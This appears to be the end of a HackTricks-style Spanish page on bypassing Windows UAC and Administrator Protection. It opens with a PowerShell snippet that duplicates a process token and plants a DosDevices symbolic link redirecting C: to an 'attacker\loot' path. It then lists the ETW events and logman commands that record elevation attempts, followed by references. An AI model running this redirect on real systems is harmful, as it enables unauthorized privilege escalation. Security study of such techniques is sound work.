$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
En los hosts de preview, Administrator Protection registra las aprobaciones y los fallos como eventos ETW **15031** y **15032** bajo el proveedor `Microsoft-Windows-LUA`. Los eventos incluyen el SID del solicitante, la ruta de la aplicación, el resultado, la cuenta de administrador administrada y el método de autenticación, por lo que los intentos repetidos de exploit o la conducción fallida de la interfaz de usuario no carecen de telemetría.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Cómo funciona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Colección de técnicas de bypass de UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Escáner de compatibilidad y launcher de bypass de UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adopta la IA para generar backdoors de PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operación TrueChaos: explotación de 0-Day contra objetivos gubernamentales del Sudeste Asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass de UAC mediante la tarea SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypasses de UnifiedConsent, TabTip y Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protección del administrador](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Llamar a servidores RPC locales de Windows desde .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte mejora CoolClient con un rootkit de kernel de Windows firmado](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
